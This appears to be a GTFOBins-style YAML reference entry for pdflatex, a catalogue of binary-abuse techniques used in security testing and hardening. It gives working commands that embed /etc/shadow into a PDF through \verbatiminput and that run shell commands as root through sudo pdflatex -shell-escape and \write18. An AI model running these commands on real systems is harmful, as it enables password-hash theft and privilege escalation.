description: `pdflatex` is a symbolic link to [`pdftex`](/gtfobins/pdftex/). However the program does not have the same behaviour regarding the name of argv[0]. This is the same behaviour for [`xetex`](/gtfobins/xetex/)/[`xelatex`](/gtfobins/xelatex/).
functions:
  file-read:
    - code: |
        echo "\documentclass[12pt]{article} \usepackage{verbatim} \hfuzz=25.002pt \begin{document} \verbatiminput{/etc/shadow} \end{document}" > read.tex
        latex read.tex
        #/etc/shadow is in read.pdf
  sudo:
    - code: |
        echo "\documentclass[12pt]{article} \begin{document} \immediate\write18{/usr/bin/whoami} \end{document}" > file.tex
        sudo pdflatex -shell-escape file.tex
